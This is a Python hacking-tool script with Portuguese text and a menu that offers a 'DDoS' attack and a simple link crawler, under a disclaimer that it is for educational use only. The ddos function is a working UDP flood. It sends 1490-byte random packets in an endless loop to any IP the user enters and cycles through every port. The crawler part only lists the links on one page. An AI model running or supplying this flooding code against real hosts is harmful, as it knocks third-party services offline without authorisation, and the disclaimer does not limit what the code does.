#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
AVISO: Este script é apenas para FINS EDUCACIONAIS e de TESTE.
O autor e o usuário não se responsabilizam por qualquer uso indevido.
Use com responsabilidade e apenas em ambientes de teste ou com autorização explícita.
SÓ TESTANDO SCRIPT PARA USER O TESTAR
"""

import os
import sys
import time
import random
import socket
import requests
import re
from urllib import request
from tqdm.auto import tqdm
from termcolor import colored
from colorama import Fore, Style, init

init()

def clearConsole():
    os.system('cls' if os.name in ('nt', 'dos') else 'clear')

def banner():
    clearConsole()
    print(Fore.RED + """
          || .---.          || .---.          || .---.          || .---.
          ||/_____/         ||/_____/         ||/_____/         ||/_____/
          ||( '.' )         ||( '.' )         ||( '.' )         ||( '.' )
          ||_\_-_/_         ||_\_-_/_         ||_\_-_/_         ||_\_-_/_
          :-\"`'V'//-.       :-\"`'V'//-.       :-\"`'V'//-.       :-\"`'V'//-.
         / ,   |// , `\    / ,   |// , `\    / ,   |// , `\    / ,   |// , `/
        / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |
       /_/||__//   || |  /_/||__//   || |  /_/||__//   || |  /_/||__//   || |
       \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |
        \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |
        /\|/_  | Ll_\ |   /\|/_  | Ll_\ |   /\|/_  | Ll_\ |   /\|/_  | Ll_\ |
           |   |   ||/       |   |   ||/       |   |   ||/       |   |   ||/
           |   |   |         |   |   |         |   |   |         |   |   |
           L___l___J         L___l___J         L___l___J         L___l___J
            |_ | _|           |_ | _|           |_ | _|           |_ | _|
           (___|___)         (___|___)         (___|___)         (___|___)
    """ + Style.RESET_ALL + Fore.YELLOW)

def ddos(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port = 1 if port >= 65534 else port + 1
            print(Fore.RED + f"Enviado {sent} pacote(s) para {ip} na porta {port}" + Fore.RESET)
    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrompido pelo usuário." + Fore.RESET)

class Crawler:
    def __init__(self):
        self.visited_links = set()

    def crawl(self, url):
        try:
            response = requests.get(url)
            if response.status_code in [401, 403, 404, 500, 502, 503, 504]:
                print(Fore.RED + f"[Erro {response.status_code}] Problema ao acessar: {url}" + Fore.RESET)
                return
            links = re.findall(r'href=["\'](http[s]?://[^"\']+)', response.text)
            for link in links:
                if link not in self.visited_links:
                    print(Fore.GREEN + f"[+] Encontrado: {link}" + Fore.RESET)
                    self.visited_links.add(link)
        except requests.RequestException as e:
            print(Fore.RED + f"Erro ao acessar {url}: {e}" + Fore.RESET)

    def result_count(self):
        print(Fore.YELLOW + f"Total de links encontrados: {len(self.visited_links)}" + Fore.RESET)

def main():
    print(Fore.CYAN + Style.BRIGHT + "Verificando conexão com a internet..." + Fore.RESET)
    for _ in tqdm(range(30000)):
        print(end='\r')
    time.sleep(1)
    try:
        request.urlopen('https://www.google.com/', timeout=3)
    except:
        print(Fore.RED + "Sem conexão com a internet." + Fore.RESET)
        return

    while True:
        banner()
        print(Fore.GREEN + Style.BRIGHT + "1." + Style.RESET_ALL + Fore.YELLOW + " DDoS")
        print(Fore.GREEN + Style.BRIGHT + "2." + Style.RESET_ALL + Fore.YELLOW + " Spider Crawler")
        print(Fore.GREEN + Style.BRIGHT + "3." + Style.RESET_ALL + Fore.YELLOW + " Sair")
        opt = input(Fore.RED + Style.BRIGHT + "\n>>> " + Fore.RESET)
        if opt == '1':
            ip = input(Fore.CYAN + "Digite o IP para ataque DDoS: " + Fore.RESET)
            port = int(input(Fore.CYAN + "Digite a porta: " + Fore.RESET))
            ddos(ip, port)
        elif opt == '2':
            url = input(Fore.CYAN + "Digite a URL para Spider Crawler: " + Fore.RESET)
            crawler = Crawler()
            crawler.crawl(url)
            crawler.result_count()
        elif opt == '3':
            print(Fore.RED + "Saindo..." + Fore.RESET)
            return
        else:
            print(Fore.RED + "Opção inválida." + Fore.RESET)
            time.sleep(2)

main()
            
